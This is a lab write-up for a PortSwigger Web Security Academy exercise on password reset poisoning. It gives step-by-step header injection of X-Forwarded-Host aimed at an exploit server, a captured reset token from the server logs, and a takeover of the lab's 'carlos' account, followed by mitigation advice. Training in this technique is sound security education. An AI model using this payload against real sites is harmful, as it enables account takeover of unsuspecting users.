# Password reset poisoning via middleware

**Source:** [PortSwigger](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware)  
**Category:** Authentication vulnerabilities  
**Difficulty:** PRACTITIONER

## Objective
To solve the lab, log in to Carlos's account.

## Vulnerability
This lab is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives.

You can log in to your own account using the following credentials: `wiener:peter`. Any emails sent to this account can be read via the email client on the exploit server.

## Exploitation

### Steps

1. Opened the login page, clicked **Forgot password?**, and entered the username `wiener`.

2. Opened the email client and viewed the received email.

```text
Sent:     2026-08-03 16:58:27 +0000
From:     "No reply" <no-reply@0ac900b9037e1d85807d762d00aa0008.web-security-academy.net>
To:       wiener@exploit-0ab200e4037b1d0a805b75710137002b.exploit-server.net
Subject:  Account recovery

Hello!

Please follow the link below to reset your password.

https://0ac900b9037e1d85807d762d00aa0008.web-security-academy.net/forgot-password?temp-forgot-password-token=za5pdh3l1ljmzgzkaexb20eg2czxjhvw

Thanks,
Support team
```

3. Intercepted the password reset request for `carlos`. The request contained the following header:

```http
Host: 0ac900b9037e1d85807d762d00aa0008.web-security-academy.net
```

Added the following header below it:

```http
X-Forwarded-Host: exploit-0ab200e4037b1d0a805b75710137002b.exploit-server.net/exploit
```

and sent the request.

4. Opened the exploit server logs and found the following request:

```text
10.0.3.29       2026-08-03 17:17:12 +0000 "GET /exploit/forgot-password?temp-forgot-password-token=djpwdkdxaojrfuuy1abnm5hjyl28sr8z HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
```

5. Copied the URL containing the token and opened it in the browser using the same format as the password reset link received for the account we had access to.

```http
https://0ac900b9037e1d85807d762d00aa0008.web-security-academy.net/forgot-password?temp-forgot-password-token=djpwdkdxaojrfuuy1abnm5hjyl28sr8z
```

The password reset form was displayed. Changed the password to `test`.

6. Attempted to log in using `carlos:test`, which was successful.

### Payload

Injected header:

```http
X-Forwarded-Host: exploit-0ab200e4037b1d0a805b75710137002b.exploit-server.net/exploit
```

Captured password reset request:

```http
GET /exploit/forgot-password?temp-forgot-password-token=djpwdkdxaojrfuuy1abnm5hjyl28sr8z HTTP/1.1
```

Recovered password reset URL:

```http
https://0ac900b9037e1d85807d762d00aa0008.web-security-academy.net/forgot-password?temp-forgot-password-token=djpwdkdxaojrfuuy1abnm5hjyl28sr8z
```

### Shortcut

1. Intercept the password reset request for `carlos` and inject an `X-Forwarded-Host` header pointing to your exploit server.
2. Wait for the victim to click the poisoned password reset link, then obtain the reset token from the exploit server logs.
3. Open the legitimate password reset page using the captured token, set a new password, and log in as `carlos`.

## Impact

An attacker can poison password reset links by manipulating headers trusted by the application. If a victim follows the malicious link, the attacker can capture the password reset token and take over the victim's account.

## Mitigation

Never use client-controlled headers such as `X-Forwarded-Host` when generating password reset URLs.

Additional protections:
- Generate password reset links using a trusted, server-side configured hostname.
- Validate and sanitize proxy-related headers.
- Use short-lived, single-use password reset tokens.
- Notify users whenever a password reset is completed.

## Tools

- Browser
- Burp Suite
- Exploit Server

## Notes

This lab demonstrates password reset poisoning through a trusted proxy header. By manipulating the `X-Forwarded-Host` header, the application generated a password reset link pointing to the attacker's server. When the victim clicked the link, the password reset token was exposed in the exploit server logs, allowing the attacker to reset the victim's password.